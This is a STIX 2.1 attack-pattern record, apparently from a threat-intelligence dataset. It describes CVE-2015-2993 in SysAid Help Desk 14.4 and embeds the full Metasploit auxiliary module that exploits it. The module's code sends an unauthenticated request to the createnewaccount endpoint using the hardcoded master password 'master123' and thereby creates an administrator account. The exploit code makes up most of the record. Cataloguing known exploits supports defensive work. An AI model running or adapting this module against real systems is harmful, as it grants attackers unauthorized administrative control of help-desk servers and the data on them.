{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--88b1f9a3-6958-49a8-93c0-2d684e62bb9a",
    "created": "2024-08-14T16:23:01.703788Z",
    "modified": "2024-08-14T16:23:01.703793Z",
    "name": "SysAid Help Desk Administrator Account Creation",
    "description": " This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated user to create an administrator account. Note that this exploit will only work once. Any subsequent attempts will fail. On the other hand, the credentials must be verified manually. This module has been tested on SysAid 14.4 in Windows and Linux. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/sysaid_admin_acct.rb",
            "external_id": "sysaid_admin_acct.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2993"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jun/8"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SysAid Help Desk Administrator Account Creation',\n        'Description' => %q{\n          This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated\n          user to create an administrator account. Note that this exploit will only work once. Any\n          subsequent attempts will fail. On the other hand, the credentials must be verified\n          manually. This module has been tested on SysAid 14.4 in Windows and Linux.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2015-2993' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Jun/8' ],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt' ],\n        ],\n        'DisclosureDate' => '2015-06-03'\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 8080]),\n        OptString.new('TARGETURI', [ true, 'SysAid path', '/sysaid']),\n        OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),\n        OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password'])\n      ]\n    )\n  end\n\n  def run\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'createnewaccount'),\n      'method' => 'GET',\n      'vars_get' => {\n        'accountID' => Rex::Text.rand_text_numeric(4),\n        'organizationName' => Rex::Text.rand_text_alpha(rand(4) + rand(8)),\n        'userName' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'masterPassword' => 'master123'\n      }\n    })\n    if res && res.code == 200 && res.body.to_s =~ /Error while creating account/\n      # No way to know whether this worked or not, it always says error\n      print_status(\"The new administrator #{datastore['USERNAME']}:#{datastore['PASSWORD']} should be checked manually\")\n\n      connection_details = {\n        module_fullname: fullname,\n        username: datastore['USERNAME'],\n        private_data: datastore['PASSWORD'],\n        private_type: :password,\n        access_level: 'Administrator',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details)\n      create_credential_and_login(connection_details)\n\n    else\n      print_error('Administrator account creation failed')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-03"
}